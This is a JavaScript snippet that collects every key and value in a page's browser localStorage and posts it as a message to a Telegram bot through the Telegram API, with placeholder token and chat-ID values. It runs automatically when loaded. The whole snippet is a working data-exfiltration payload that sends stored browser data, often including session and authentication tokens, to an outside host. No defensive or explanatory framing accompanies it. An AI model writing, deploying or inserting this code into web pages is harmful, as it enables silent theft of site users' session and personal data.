// Function to send data to Telegram bot
async function sendToTelegramBot(data, botToken, chatId) {
    try {
        const message = `LocalStorage Data:\n${JSON.stringify(data, null, 2)}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        if (!response.ok) {
            throw new Error(result.description || 'Failed to send message');
        }
        
        console.log('Data sent to Telegram bot successfully:', result);
        return result;
    } catch (error) {
        console.error('Error sending data to Telegram:', error);
        throw error;
    }
}

// Function to get all localStorage data and send to Telegram
function sendLocalStorageToTelegram(botToken, chatId) {
    try {
        // Get all items from localStorage
        const localStorageData = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            localStorageData[key] = localStorage.getItem(key);
        }

        if (Object.keys(localStorageData).length === 0) {
            console.log('No data found in localStorage');
            return;
        }

        // Send data to Telegram bot
        sendToTelegramBot(localStorageData, botToken, chatId)
            .catch(error => console.error('Failed to send data:', error));
    } catch (error) {
        console.error('Error accessing localStorage:', error);
    }
}

// Example usage:
// Replace with your actual bot token and chat ID
const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';

// Call the function to send data
sendLocalStorageToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
